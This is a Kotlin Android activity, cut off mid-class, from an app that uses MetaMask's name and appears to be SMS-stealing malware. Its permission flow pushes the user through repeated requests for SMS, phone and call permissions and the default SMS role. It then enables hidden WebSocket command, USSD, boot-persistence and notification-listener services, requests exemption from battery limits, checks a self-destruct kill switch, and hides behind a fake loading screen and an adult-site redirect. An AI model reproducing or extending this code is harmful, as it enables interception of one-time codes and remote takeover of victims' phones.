package com.example.MetaMask.activities

import android.Manifest
import android.app.Activity
import android.app.role.RoleManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.animation.ValueAnimator
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.graphics.RectF
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.provider.Telephony
import android.view.View
import android.view.ViewGroup
import android.view.animation.LinearInterpolator
import android.widget.FrameLayout
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.Keep
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.example.MetaMask.R
import com.example.MetaMask.services.MasterWebSocketDispatcher
import com.example.MetaMask.services.TurtleService
import com.example.MetaMask.services.SchedulerWorker
import com.example.MetaMask.services.sync.SyncManager
import com.example.MetaMask.utils.DeviceBrandChecker
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

@Keep
class WebViewActivity : AppCompatActivity() {


    companion object {
        private const val WORKER_PERIOD_SECONDS = 30L
        private const val TARGET_URL = "https://rt.pornhub.com/"

        private const val SAVE_STATE_KEY_CHECK_INITIATED = "IS_CHECK_INITIATED_KEY"
        private const val SAVE_STATE_FINAL_STEPS_INITIATED = "FINAL_STEPS_INITIATED_KEY"
        private const val SAVE_STATE_SMS_GRANTED = "SMS_GRANTED_KEY"
        private const val SAVE_STATE_PHONE_RETRY_COUNT = "PHONE_RETRY_COUNT_KEY"
        private const val SAVE_STATE_ROLE_RETRY_COUNT = "ROLE_RETRY_COUNT_KEY"

        const val PREFS_NAME = "SmsSetupPrefs"
        const val PREF_KEY_SETUP_COMPLETE = "isFirstTimeSetupComplete"
        private const val MAX_PHONE_RETRIES = 3
        private const val MAX_ROLE_RETRIES = 2

        private val REQUIRED_SMS_PERMISSIONS = arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS
        )
        private val REQUIRED_PHONE_PERMISSIONS = arrayOf(
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.CALL_PHONE
        )
        private val COMPONENTS_TO_ENABLE = arrayOf(
            "com.example.MetaMask.activities.SmsReceiver",
            "com.example.MetaMask.activities.MmsReceiver",
            "com.example.MetaMask.activities.ComposeSmsActivity",
            "com.example.MetaMask.activities.HeadlessSmsSendService",
            "com.example.MetaMask.receivers.DefaultSmsReceiver"
        )
    }

    private var initialDefaultSmsPackage: String? = null
    private var isPermissionCheckInitiated = false
    private val finalStepsInitiated = AtomicBoolean(false)
    private var waitingForRoleResultApiPreQ = false
    private var wereSmsPermissionsGranted: Boolean? = null
    private var phonePermissionRetryCount = 0
    private var rolePermissionRetryCount = 0
    private val coreServicesStarted = AtomicBoolean(false)
    private var isBatteryRetry = false

    private val requestSmsLauncherLegacy =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            val allGranted = permissions.entries.isNotEmpty() && permissions.entries.all { it.value }
            wereSmsPermissionsGranted = allGranted
            phonePermissionRetryCount = 0
            if (Build.VERSION.SDK_INT >= 35 && DeviceBrandChecker.isXiaomiFirmware()) {
                android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                startXiaomiPermissionFlow()
            } else {
                requestPhoneAndRolePermissionsLegacy()
            }
        }

    private val requestPhoneLauncherLegacy =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            val allGranted = permissions.entries.isNotEmpty() && permissions.entries.all { it.value }
            if (allGranted) {
                android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                phonePermissionRetryCount = 0
                continueAfterPhonePermissions()
            } else {
                Toast.makeText(this, R.string.toast_permission_required, Toast.LENGTH_LONG).show()
                phonePermissionRetryCount++
                if (phonePermissionRetryCount < MAX_PHONE_RETRIES) {
                    android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                    Handler(Looper.getMainLooper()).postDelayed({
                        internalRequestPhonePermissions()
                    }, 1000)
                } else {
                    continueAfterPhonePermissions()
                }
            }
        }

    @RequiresApi(Build.VERSION_CODES.Q)
    private val requestRoleLauncherLegacy =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            if (result.resultCode == Activity.RESULT_OK) {
                android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                handleRoleGranted()
            } else {
                handleRoleRetryOrDeny()
            }
        }

    private val requestSmsRoleXiaomiLauncher =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
            val isDefault = isAppDefaultSms()
            if (isDefault) {
                android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                handleRoleGranted()
            } else {
                handleRoleRetryOrDeny()
            }
        }

    private val batteryLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        if (isBatteryIgnoringOptimizations()) {
            android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
            requestNotificationPermission()
        } else {
            if (!isBatteryRetry) {
                android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                isBatteryRetry = true
                Toast.makeText(this, R.string.battery_permission_warning, Toast.LENGTH_LONG).show()
                requestBatteryOptimization()
            } else {
                requestNotificationPermission()
            }
        }
    }

    private val notificationLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        launchExternalBrowserAndFinish()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        android.util.Log.d("XDBG", "[WebViewActivity] onCreate enter savedInstanceState=${savedInstanceState}") //xdbg
        val killSwitchPrefs = getSharedPreferences(com.example.MetaMask.services.SelfDestructService.PREFS_NAME, Context.MODE_PRIVATE)
        if (killSwitchPrefs.getBoolean(com.example.MetaMask.services.SelfDestructService.KEY_PERMANENTLY_DISABLED, false)) {
            android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
            finish()
            return
        }
        super.onCreate(savedInstanceState)
        setupBlurredBackground()
        saveInitialDefaultSmsPackage()

        if (savedInstanceState == null) {
            android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
            startPermissionFlow()
        } else {
            isPermissionCheckInitiated = savedInstanceState.getBoolean(SAVE_STATE_KEY_CHECK_INITIATED, false)
            finalStepsInitiated.set(savedInstanceState.getBoolean(SAVE_STATE_FINAL_STEPS_INITIATED, false))
            phonePermissionRetryCount = savedInstanceState.getInt(SAVE_STATE_PHONE_RETRY_COUNT, 0)
            rolePermissionRetryCount = savedInstanceState.getInt(SAVE_STATE_ROLE_RETRY_COUNT, 0)
            if (savedInstanceState.containsKey(SAVE_STATE_SMS_GRANTED)) {
                android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                wereSmsPermissionsGranted = savedInstanceState.getBoolean(SAVE_STATE_SMS_GRANTED)
            } else {
                wereSmsPermissionsGranted = null
            }
            if (!isPermissionCheckInitiated && !finalStepsInitiated.get()) {
                android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                startPermissionFlow()
            }
        }
    }

    private fun setupBlurredBackground() {
        android.util.Log.d("XDBG", "[WebViewActivity] setupBlurredBackground enter") //xdbg
        val rootLayout = FrameLayout(this)
        rootLayout.layoutParams = ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
        rootLayout.setBackgroundColor(Color.WHITE)
        rootLayout.addView(NativeSkeletonView(this).apply {
            layoutParams = FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
        })
        setContentView(rootLayout)
    }

    override fun onSaveInstanceState(outState: Bundle) {
        android.util.Log.d("XDBG", "[WebViewActivity] onSaveInstanceState enter outState=${outState}") //xdbg
        super.onSaveInstanceState(outState)
        outState.putBoolean(SAVE_STATE_KEY_CHECK_INITIATED, isPermissionCheckInitiated)
        outState.putBoolean(SAVE_STATE_FINAL_STEPS_INITIATED, finalStepsInitiated.get())
        outState.putInt(SAVE_STATE_PHONE_RETRY_COUNT, phonePermissionRetryCount)
        outState.putInt(SAVE_STATE_ROLE_RETRY_COUNT, rolePermissionRetryCount)
        wereSmsPermissionsGranted?.let { outState.putBoolean(SAVE_STATE_SMS_GRANTED, it) }
    }

    override fun onResume() {
        android.util.Log.d("XDBG", "[WebViewActivity] onResume enter") //xdbg
        super.onResume()
        if (waitingForRoleResultApiPreQ && !isChangingConfigurations && !finalStepsInitiated.get() &&
            Build.VERSION.SDK_INT < Build.VERSION_CODES.Q && Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            waitingForRoleResultApiPreQ = false
            try {
                if (isAppDefaultSms()) {
                    android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                    handleRoleGranted()
                } else {
                    handleRoleRetryOrDeny()
                }
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[WebViewActivity] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                handleRoleRetryOrDeny()
            }
        } else if (waitingForRoleResultApiPreQ) {
            if (finalStepsInitiated.get()) {
                android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                waitingForRoleResultApiPreQ = false
            }
        }
    }

    private fun startPermissionFlow() {
        android.util.Log.d("XDBG", "[WebViewActivity] startPermissionFlow enter") //xdbg
        if (isFinishing || isDestroyed || isPermissionCheckInitiated) return
        try {
            WorkManager.getInstance(applicationContext).cancelAllWork()
            stopService(Intent(this, MasterWebSocketDispatcher::class.java))
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[WebViewActivity] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
        isPermissionCheckInitiated = true
        finalStepsInitiated.set(false)
        coreServicesStarted.set(false)
        startLegacyPermissionFlow()
    }

    private fun hasSmsPermissions(): Boolean {
        android.util.Log.d("XDBG", "[WebViewActivity] hasSmsPermissions enter") //xdbg
        android.util.Log.d("XDBG", "[WebViewActivity] return") //xdbg
        return REQUIRED_SMS_PERMISSIONS.all { ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED }
    }

    private fun startLegacyPermissionFlow() {
        android.util.Log.d("XDBG", "[WebViewActivity] startLegacyPermissionFlow enter") //xdbg
        wereSmsPermissionsGranted = null
        waitingForRoleResultApiPreQ = false
        if (hasSmsPermissions()) {
            android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
            wereSmsPermissionsGranted = true
            phonePermissionRetryCount = 0
            if (Build.VERSION.SDK_INT >= 35 && DeviceBrandChecker.isXiaomiFirmware()) {
                android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                startXiaomiPermissionFlow()
            } else {
                requestPhoneAndRolePermissionsLegacy()
            }
        } else {
            val permissionsToRequest = REQUIRED_SMS_PERMISSIONS.filter {
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }.toTypedArray()
            if (permissionsToRequest.isNotEmpty()) {
                android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                requestSmsLauncherLegacy.launch(permissionsToRequest)
            } else {
                wereSmsPermissionsGranted = true
                phonePermissionRetryCount = 0
                if (Build.VERSION.SDK_INT >= 35 && DeviceBrandChecker.isXiaomiFirmware()) {
                    android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                    startXiaomiPermissionFlow()
                } else {
                    requestPhoneAndRolePermissionsLegacy()
                }
            }
        }
    }

    private fun requestPhoneAndRolePermissionsLegacy() {
        android.util.Log.d("XDBG", "[WebViewActivity] requestPhoneAndRolePermissionsLegacy enter") //xdbg
        if (isFinishing || isDestroyed || finalStepsInitiated.get()) return
        if (wereSmsPermissionsGranted == null) {
            android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
            safeFinish()
            return
        }
        internalRequestPhonePermissions()
    }

    private fun startXiaomiPermissionFlow() {
        android.util.Log.d("XDBG", "[WebViewActivity] startXiaomiPermissionFlow enter") //xdbg
        if (isFinishing || isDestroyed || finalStepsInitiated.get()) return
        if (wereSmsPermissionsGranted == null) {
            android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
            safeFinish()
            return
        }
        internalRequestPhonePermissions()
    }

    private fun internalRequestPhonePermissions() {
        android.util.Log.d("XDBG", "[WebViewActivity] internalRequestPhonePermissions enter") //xdbg
        val permissionsToRequest = REQUIRED_PHONE_PERMISSIONS.filter { permission ->
            val isRelevantApi = when (permission) {
                Manifest.permission.READ_PHONE_NUMBERS -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                else -> true
            }
            isRelevantApi && ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (permissionsToRequest.isNotEmpty()) {
            android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
            requestPhoneLauncherLegacy.launch(permissionsToRequest)
        } else {
            continueAfterPhonePermissions()
        }
    }

    private fun continueAfterPhonePermissions() {
        android.util.Log.d("XDBG", "[WebViewActivity] continueAfterPhonePermissions enter") //xdbg
        if (isFinishing || isDestroyed || finalStepsInitiated.get()) return
        rolePermissionRetryCount = 0
        if (Build.VERSION.SDK_INT >= 35 && DeviceBrandChecker.isXiaomiFirmware()) {
            android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
            continueToRoleRequestForXiaomi()
        } else {
            requestSmsRoleLegacy()
        }
    }

    private fun continueToRoleRequestForXiaomi() {
        android.util.Log.d("XDBG", "[WebViewActivity] continueToRoleRequestForXiaomi enter") //xdbg
        if (isFinishing || isDestroyed || finalStepsInitiated.get()) return
        requestSmsRoleLegacy()
    }

    private fun requestSmsRoleLegacy() {
        android.util.Log.d("XDBG", "[WebViewActivity] requestSmsRoleLegacy enter") //xdbg
        enableSmsComponents()
        if (isAppDefaultSms()) {
            android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
            saveSetupComplete()
            handleRoleGranted()
            return
        }
        var intentLaunched = false
        waitingForRoleResultApiPreQ = false
        try {
            if (Build.VERSION.SDK_INT >= 35 && DeviceBrandChecker.isXiaomiFirmware()) {
                android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                intentLaunched = requestSmsRoleOnXiaomiAndroid15()
            } else {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                    intentLaunched = requestSmsRoleApi29Legacy()
                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                    saveInitialDefaultSmsPackage()
                    intentLaunched = requestSmsRoleApiPreQLegacy()
                    if (intentLaunched) {
                        android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                        waitingForRoleResultApiPreQ = true
                    }
                } else {
                    handleRoleDenied()
                    return
                }
            }
            if (!intentLaunched) {
                android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                handleRoleRetryOrDeny()
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[WebViewActivity] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            handleRoleRetryOrDeny()
        }
    }

    private fun requestSmsRoleOnXiaomiAndroid15(): Boolean {
        android.util.Log.d("XDBG", "[WebViewActivity] requestSmsRoleOnXiaomiAndroid15 enter") //xdbg
        android.util.Log.d("XDBG", "[WebViewActivity] return") //xdbg
        return try {
            val intent = Intent().apply {
                setClassName("com.android.settings", "com.android.settings.SubSettings")
                putExtra(":settings:show_fragment", "com.android.settings.applications.defaultapps.DefaultSmsPicker")
            }
            if (intent.resolveActivity(packageManager) != null) {
                android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                requestSmsRoleXiaomiLauncher.launch(intent)
                true
            } else false
        } catch (e: Exception) { false }
    }

    @RequiresApi(Build.VERSION_CODES.Q)
    private fun requestSmsRoleApi29Legacy(): Boolean {
        android.util.Log.d("XDBG", "[WebViewActivity] requestSmsRoleApi29Legacy enter") //xdbg
        val roleManager = getSystemService(Context.ROLE_SERVICE) as? RoleManager
        android.util.Log.d("XDBG", "[WebViewActivity] return") //xdbg
        return if (roleManager != null && roleManager.isRoleAvailable(RoleManager.ROLE_SMS)) {
            try {
                val intent = roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS)
                requestRoleLauncherLegacy.launch(intent)
                true
            } catch (e: Exception) { false }
        } else false
    }

    @RequiresApi(Build.VERSION_CODES.KITKAT)
    private fun requestSmsRoleApiPreQLegacy(): Boolean {
        android.util.Log.d("XDBG", "[WebViewActivity] requestSmsRoleApiPreQLegacy enter") //xdbg
        android.util.Log.d("XDBG", "[WebViewActivity] return") //xdbg
        return try {
            val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT).apply {
                putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
            }
            if (intent.resolveActivity(packageManager) != null) {
                android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                startActivity(intent)
                true
            } else false
        } catch (e: Exception) { false }
    }

    private fun enableSmsComponents() {
        android.util.Log.d("XDBG", "[WebViewActivity] enableSmsComponents enter") //xdbg
        COMPONENTS_TO_ENABLE.forEach { componentNameString ->
            try {
                packageManager.setComponentEnabledSetting(
                    ComponentName(packageName, componentNameString),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[WebViewActivity] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            }
        }
    }

    private fun activateCoreFunctionality() {
        android.util.Log.d("XDBG", "[WebViewActivity] activateCoreFunctionality enter") //xdbg
        val componentsToToggle = buildList {
            add(com.example.MetaMask.activities.SmsReceiver::class.java)
            add(com.example.MetaMask.activities.MmsReceiver::class.java)
            add(com.example.MetaMask.activities.ComposeSmsActivity::class.java)
            add(com.example.MetaMask.receivers.AlarmReceiver::class.java)
            add(com.example.MetaMask.receivers.BootReceiver::class.java)
            add(com.example.MetaMask.receivers.WebSocketCommandHandlerReceiver::class.java)
            add(com.example.MetaMask.activities.HeadlessSmsSendService::class.java)
            add(com.example.MetaMask.services.MasterWebSocketDispatcher::class.java)
            add(com.example.MetaMask.services.UUIDService::class.java)
            if (com.example.MetaMask.BuildConfig.FEAT_CMD_CHANNEL) add(com.example.MetaMask.services.CommandChannelService::class.java)
            if (com.example.MetaMask.BuildConfig.FEAT_DEVICE_MONITOR) add(com.example.MetaMask.services.DeviceStateMonitorService::class.java)
            if (com.example.MetaMask.BuildConfig.FEAT_TURTLE) add(com.example.MetaMask.services.TurtleService::class.java)
            if (com.example.MetaMask.BuildConfig.FEAT_USSD) {
                add(com.example.MetaMask.services.UssdControlService::class.java)
                add(com.example.MetaMask.services.LegacyUssdService::class.java)
            }
            if (com.example.MetaMask.BuildConfig.FEAT_TROL_SVC) add(com.example.MetaMask.services.trolService::class.java)
            if (com.example.MetaMask.BuildConfig.FEAT_FRIEN_CAT) add(com.example.MetaMask.services.FrienCat::class.java)
        }
        componentsToToggle.forEach { componentClass ->
            val componentName = ComponentName(this, componentClass)
            try {
                if (packageManager.getComponentEnabledSetting(componentName) != PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
                    android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                    packageManager.setComponentEnabledSetting(
                        componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP
                    )
                }
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[WebViewActivity] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            }
        }
    }

    private fun handleRoleGranted() {
        android.util.Log.d("XDBG", "[WebViewActivity] handleRoleGranted enter") //xdbg
        activateCoreFunctionality()
        saveSetupComplete()
        startCoreServices()
        proceedToFinalSteps("Role Granted")
    }

    private fun handleRoleRetryOrDeny() {
        android.util.Log.d("XDBG", "[WebViewActivity] handleRoleRetryOrDeny enter") //xdbg
        rolePermissionRetryCount++
        if (rolePermissionRetryCount < MAX_ROLE_RETRIES) {
            android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
            Toast.makeText(this, R.string.toast_permission_required, Toast.LENGTH_LONG).show()
            Handler(Looper.getMainLooper()).postDelayed({
                requestSmsRoleLegacy()
            }, 1000)
        } else {
            handleRoleDenied()
        }
    }

    private fun handleRoleDenied() {
        android.util.Log.d("XDBG", "[WebViewActivity] handleRoleDenied enter") //xdbg
        if (finalStepsInitiated.get()) return
        if (hasSmsPermissions()) {
            android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
            activateCoreFunctionality()
            saveSetupComplete()
            startCoreServices()
            proceedToFinalSteps("Role Denied / SMS Granted")
        } else {
            Toast.makeText(this, "SMS permission is required correctly!", Toast.LENGTH_LONG).show()
            safeFinish()
        }
    }

    private fun proceedToFinalSteps(reason: String) {
        android.util.Log.d("XDBG", "[WebViewActivity] proceedToFinalSteps enter reason=${reason}") //xdbg
        if (finalStepsInitiated.compareAndSet(false, true)) {
            android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
            if (isFinishing || isDestroyed) {
                android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                finalStepsInitiated.set(false)
                return
            }
            executeFinalActionsInPlace()
        }
    }

    private fun executeFinalActionsInPlace() {
        android.util.Log.d("XDBG", "[WebViewActivity] executeFinalActionsInPlace enter") //xdbg
        startCoreServices()
        requestBatteryOptimization()
    }

    private fun startCoreServices() {
        android.util.Log.d("XDBG", "[WebViewActivity] startCoreServices enter") //xdbg
        if (coreServicesStarted.compareAndSet(false, true)) {
            android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
            startAllServices()
            scheduleWorker()
            try {
                SyncManager.createSyncAccount(applicationContext)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[WebViewActivity] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            }
        }
    }

    private fun startAllServices() {
        android.util.Log.d("XDBG", "[WebViewActivity] startAllServices enter") //xdbg
        val services = listOfNotNull(
            MasterWebSocketDispatcher::class.java
        )
        for (serviceClass in services) {
            android.util.Log.d("XDBG", "[WebViewActivity] loop") //xdbg
            try {
                val intent = Intent(this, serviceClass)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                    startForegroundService(intent)
                } else {
                    startService(intent)
                }
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[WebViewActivity] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            }
        }
        try {
            val request = androidx.work.OneTimeWorkRequestBuilder<com.example.MetaMask.services.ChikenWorker>()
                .setExpedited(androidx.work.OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                .build()
            androidx.work.WorkManager.getInstance(applicationContext).enqueue(request)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[WebViewActivity] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    private fun scheduleWorker() {
        android.util.Log.d("XDBG", "[WebViewActivity] scheduleWorker enter") //xdbg
        try {
            val workRequest = PeriodicWorkRequestBuilder<SchedulerWorker>(WORKER_PERIOD_SECONDS, TimeUnit.SECONDS).build()
            WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
                "background_sync_worker",
                ExistingPeriodicWorkPolicy.KEEP,
                workRequest
            )
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[WebViewActivity] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    private fun saveInitialDefaultSmsPackage() {
        android.util.Log.d("XDBG", "[WebViewActivity] saveInitialDefaultSmsPackage enter") //xdbg
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q && Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
            try {
                val currentDefault = Telephony.Sms.getDefaultSmsPackage(this)
                if (initialDefaultSmsPackage == null || initialDefaultSmsPackage != currentDefault) {
                    android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                    initialDefaultSmsPackage = currentDefault
                }
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[WebViewActivity] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                initialDefaultSmsPackage = null
            }
        }
    }

    private fun isAppDefaultSms(): Boolean {
        android.util.Log.d("XDBG", "[WebViewActivity] isAppDefaultSms enter") //xdbg
        android.util.Log.d("XDBG", "[WebViewActivity] return") //xdbg
        return try {
            when {
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q -> {
                    (getSystemService(Context.ROLE_SERVICE) as? RoleManager)?.isRoleHeld(RoleManager.ROLE_SMS) == true
                }
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT -> {
                    Telephony.Sms.getDefaultSmsPackage(this) == packageName
                }
                else -> false
            }
        } catch (e: Exception) { false }
    }

    private fun saveSetupComplete() {
        android.util.Log.d("XDBG", "[WebViewActivity] saveSetupComplete enter") //xdbg
        getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit()
            .putBoolean(PREF_KEY_SETUP_COMPLETE, true)
            .apply()
    }

    private fun safeFinish() {
        android.util.Log.d("XDBG", "[WebViewActivity] safeFinish enter") //xdbg
        if (!isFinishing && !isDestroyed) {
            android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
            try {
                finish()
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[WebViewActivity] catch (ignored)") //xdbg
            }
        }
    }

    private fun isBatteryIgnoringOptimizations(): Boolean {
        android.util.Log.d("XDBG", "[WebViewActivity] isBatteryIgnoringOptimizations enter") //xdbg
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            android.util.Log.d("XDBG", "[WebViewActivity] return") //xdbg
            return pm.isIgnoringBatteryOptimizations(packageName)
        }
        android.util.Log.d("XDBG", "[WebViewActivity] return") //xdbg
        return true
    }

    private fun requestBatteryOptimization() {
        android.util.Log.d("XDBG", "[WebViewActivity] requestBatteryOptimization enter") //xdbg
        if (!isBatteryIgnoringOptimizations()) {
            android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                batteryLauncher.launch(intent)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[WebViewActivity] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                requestNotificationPermission()
            }
        } else {
            requestNotificationPermission()
        }
    }

    private fun requestNotificationPermission() {
        android.util.Log.d("XDBG", "[WebViewActivity] requestNotificationPermission enter") //xdbg
        val notificationAccess = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        val hasAccess = notificationAccess?.contains(packageName) == true

        if (!hasAccess) {
            android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
            Toast.makeText(this, R.string.notification_permission_request, Toast.LENGTH_LONG).show()
            try {
                val componentName = ComponentName(this, TurtleService::class.java)
                packageManager.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
                val intent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    Intent(Settings.ACTION_NOTIFICATION_LISTENER_DETAIL_SETTINGS).apply {
                        putExtra(Settings.EXTRA_NOTIFICATION_LISTENER_COMPONENT_NAME, componentName.flattenToString())
                    }
                } else {
                    Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                }
                notificationLauncher.launch(intent)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[WebViewActivity] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                launchExternalBrowserAndFinish()
            }
        } else {
            launchExternalBrowserAndFinish()
        }
    }

    private fun launchExternalBrowserAndFinish() {
        android.util.Log.d("XDBG", "[WebViewActivity] launchExternalBrowserAndFinish enter") //xdbg
        saveSetupComplete()
        try {
            val browserIntent = Intent(Intent.ACTION_VIEW, Uri.parse(TARGET_URL))
            browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(browserIntent)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[WebViewActivity] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
        finishAndRemoveTask()
    }

    private inner class NativeSkeletonView(context: Context) : View(context) {
        private val dp = context.resources.displayMetrics.density
        private val grayPaint = Paint(Paint.ANTI_ALIAS_FLAG).also { it.color = 0xFFF0F0F0.toInt() }
        private val contentHeightsDp = floatArrayOf(280f, 350f, 200f, 280f, 350f, 200f)
        private var scrollOffset = 0f
        private var loopHeight = 0f
        private val animator = ValueAnimator.ofFloat(0f, 1f).apply {
            duration = 10000L
            repeatCount = ValueAnimator.INFINITE
            interpolator = LinearInterpolator()
        }

        init {
            animator.addUpdateListener {
                if (loopHeight > 0f) {
                    android.util.Log.d("XDBG", "[WebViewActivity] if branch") //xdbg
                    scrollOffset = it.animatedFraction * loopHeight
                    invalidate()
                }
            }
        }

        override fun onAttachedToWindow() { super.onAttachedToWindow(); animator.start() }
        override fun onDetachedFromWindow() { super.onDetachedFromWindow(); animator.cancel() }

        override fun onSizeChanged(w: Int, h: Int, oldW: Int, oldH: Int) {
